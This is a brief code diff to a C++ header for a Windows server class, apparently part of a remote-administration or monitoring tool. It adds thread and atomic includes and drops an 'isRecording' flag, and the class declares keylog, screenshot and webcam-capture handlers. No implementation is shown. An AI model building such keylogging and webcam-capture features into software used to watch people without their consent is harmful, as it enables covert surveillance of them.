@@ -6,6 +6,8 @@
 #include <opencv2/highgui/highgui.hpp>
 #include <windows.h>
 #include <stdio.h>
+#include <thread>
+#include <atomic>
 #include <filesystem>
 
 using namespace cv;
@@ -34,7 +36,6 @@ class Server {
         bool keylog(Request& request, Response &response);
 
         //Duc
-        bool isRecording;
         bool screenshot(Request& request, Response &response);
         bool getVideoByWebcam(Request& request, Response &response);
         
